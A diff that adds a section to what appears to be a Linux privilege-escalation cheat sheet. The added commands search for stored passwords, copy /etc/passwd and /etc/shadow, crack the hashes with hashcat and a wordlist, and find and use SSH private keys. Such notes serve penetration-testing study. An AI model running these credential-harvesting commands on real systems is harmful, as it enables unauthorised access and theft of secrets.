@@ -61,6 +61,56 @@ ps aux | grep root
   2. Download, compile, and run it against the target if it exists
   3. Try something else if it does not exist.
 
+## Escalation via Password & File Permissions
+### Stored Password
+A password may be stored in the bash history
+```bash
+history
+```
+Or in the files 
+```bash
+grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSW" {} /dev/null \;
+```
+### Weak File Permissions
+Verify File Permissions
+```bash
+ls -la /etc/passwd
+ls -la /etc/shadow
+```
+Copy the content of these files
+```bash
+cat -la /etc/passwd
+cat -la /etc/shadow
+```
+```bash
+unshadow <passwd_File> <shadow_file>
+```
+Identify the hash
+```web
+https://hashcat.net/wiki/doku.php?id=example_hashes
+```
+Crack the Hash with hashcat
+```powershell
+.\hashcat64.exe -m <hash_typw> <unshadowed_file> .\rockyou.txt -O
+```
+
+### SSH Keys
+Find SSH Keys
+```bash
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+```
+Download the SSH key
+Change the permissions on the key 
+```bash
+chmod 600 id_rsa
+```
+Attempt the key
+```bash
+ssh -i id_rsa <user>@<ip>
+```
+
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
 ```bash
